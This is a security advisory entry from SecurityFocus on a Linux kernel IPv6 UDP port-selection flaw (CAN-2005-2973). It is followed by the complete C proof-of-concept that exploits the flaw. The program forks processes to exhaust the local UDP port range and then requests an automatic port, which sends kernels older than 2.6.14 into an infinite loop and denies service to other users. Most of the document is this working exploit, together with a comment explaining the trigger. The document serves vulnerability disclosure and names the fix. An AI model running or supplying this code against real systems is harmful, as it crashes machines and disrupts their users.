source: http://www.securityfocus.com/bid/15365/info

Linux Kernel is reported prone to a local denial-of-service vulnerability. This issue arises from a failure to properly unregister kernel resources when network devices are removed.

This issue allows local attackers to deny service to legitimate users. Attackers may also be able to execute arbitrary code in the context of the kernel, but this has not been confirmed. 

/*
 * Linux kernel
 * IPv6 UDP port selection infinite loop
 * local denial of service vulnerability
 * proof of concept code
 * version 1.0 (Oct 29 2005)
 * CVE ID: CAN-2005-2973
 *
 * by Remi Denis-Courmont < exploit at simphalempin dot com >
 *   http://www.simphalempin.com/dev/
 *
 * Vulnerable:
 *  - Linux < 2.6.14 with IPv6
 *
 * Not vulnerable:
 *  - Linux >= 2.6.14
 *  - Linux without IPv6
 *
 * Fix:
 * http://www.kernel.org/git/?p=linux/kernel/git/torvalds/linux-2.6.git;
 * a=commit;h=87bf9c97b4b3af8dec7b2b79cdfe7bfc0a0a03b2
 */


/*****************************************************************************
 * Copyright (C) 2005  Remi Denis-Courmont.  All rights reserved.            *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 * 1. Redistributions of source code must retain the above copyright notice, *
 *    this list of conditions and the following disclaimer.                  *
 * 2. Redistribution in binary form must reproduce the above copyright       *
 *    notice, this list of conditions and the following disclaimer in the    *
 *    documentation and/or other materials provided with the distribution.   *
 *                                                                           *
 * The author's liability shall not be incurred as a result of loss of due   *
 * the total or partial failure to fulfill anyone's obligations and direct   *
 * or consequential loss due to the software's use or performance.           *
 *                                                                           *
 * The current situation as regards scientific and technical know-how at the *
 * time when this software was distributed did not enable all possible uses  *
 * to be tested and verified, nor for the presence of any or all faults to   *
 * be detected. In this respect, people's attention is drawn to the risks    *
 * associated with loading, using, modifying and/or developing and           *
 * reproducing this software.                                                *
 * The user shall be responsible for verifying, by any or all means, the     *
 * software's suitability for its requirements, its due and proper           *
 * functioning, and for ensuring that it shall not cause damage to either    *
 * persons or property.                                                      *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *
 *                                                                           *
 * The author does not either expressly or tacitly warrant that this         *
 * software does not infringe any or all third party intellectual right      *
 * relating to a patent, software or to any or all other property right.     *
 * Moreover, the author shall not hold someone harmless against any or all   *
 * proceedings for infringement that may be instituted in respect of the     *
 * use, modification and redistrbution of this software.                     *
 *****************************************************************************/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <errno.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

static int
bind_udpv6_port (uint16_t port)
{
	int fd;

	fd = socket (AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
	if (fd != -1)
	{
		struct sockaddr_in6 addr;
		int val = 1;

		setsockopt (fd, SOL_SOCKET, SO_REUSEADDR, &val, sizeof (val));

		memset (&addr, 0, sizeof (addr));
		addr.sin6_family = AF_INET6;
		addr.sin6_port = htons (port);
		if (bind (fd, (struct sockaddr *)&addr, sizeof (addr)) == 0)
			return fd;

		close (fd);
	}
	return -1;
}


static int
get_fd_limit (void)
{
	struct rlimit lim;

	getrlimit (RLIMIT_NOFILE, &lim);
	lim.rlim_cur = lim.rlim_max;
	setrlimit (RLIMIT_NOFILE, &lim);
	return (int)lim.rlim_max;
}


static void
get_port_range (uint16_t *range)
{
	FILE *stream;

	/* conservative defaults */
	range[0] = 1024;
	range[1] = 65535;

	stream = fopen ("/proc/sys/net/ipv4/ip_local_port_range", "r");
	if (stream != NULL)
	{
		unsigned i[2];

		if ((fscanf (stream, "%u %u", i, i + 1) == 2)
		 && (i[0] <= i[1]) && (i[1] < 65535))
		{
			range[0] = (uint16_t)i[0];
			range[1] = (uint16_t)i[1];
		}
		fclose (stream);
	}
}


/* The criticial is fairly simple to raise : the infinite loop occurs when
 * calling bind with no speficied port number (ie zero), if and only if the
 * IPv6 stack cannot find any free UDP port within the local port range
 * (normally 32768-61000). Because this requires times more sockets than what
 * a process normally can open at a given time, we have to spawn several
 * processes. Then, the simplest way to trigger the crash condition consists
 * of opening up kernel-allocated UDP ports until it crashes, but that is
 * fairly slow (because allocation are stored in small a hash table of lists,
 * that are checked at each allocation). A much faster scheme involves getting
 * the local port range from /proc, allocating one by one, and only then, ask
 * for automatic (any/zero) port allocation.
 */
static int
proof (void)
{
	int lim, val = 2;
	pid_t pid, ppid;
	uint16_t range[2], port;

	lim = get_fd_limit ();
	if (lim <= 3)
		return -2;

	get_port_range (range);

	port = range[0];
	ppid = getpid ();

	puts ("Stage 1...");
	do
	{
		switch (pid = fork ())
		{
			case 0:
				for (val = 3; val < lim; val++)
					close (val);

				do
				{
					if (bind_udpv6_port (port) >= 0)
					{
						if (port)
							port++;
					}
					else
					if (port && (errno == EADDRINUSE))
						port++; /* skip already used port */
					else
					if (errno != EMFILE)
						/* EAFNOSUPPORT -> no IPv6 stack */
						/* EADDRINUSE -> not vulnerable */
						exit (1);

					if (port > range[1])
					{
						puts ("Stage 2... should crash quickly");
						port = 0;
					}
				}
				while (errno != EMFILE);

				break; /* EMFILE: spawn new process */

			case -1:
				exit (2);

			default:
				wait (&val);
				if (ppid != getpid ())
					exit (WIFEXITED (val) ? WEXITSTATUS (val) : 2);
		}
	}
	while (pid == 0);

	puts ("System not vulnerable");
	return -val;
}

int
main (int argc, char *argv[])
{
	setvbuf (stdout, NULL, _IONBF, 0);
	puts ("Linux kernel IPv6 UDP port infinite loop vulnerability\n"
	      "proof of concept code\n"
	      "Copyright (C) 2005 Remi Denis-Courmont "
	      "<\x65\x78\x70\x6c\x6f\x69\x74\x40\x73\x69\x6d\x70"
	      "\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n");

	return -proof ();
}

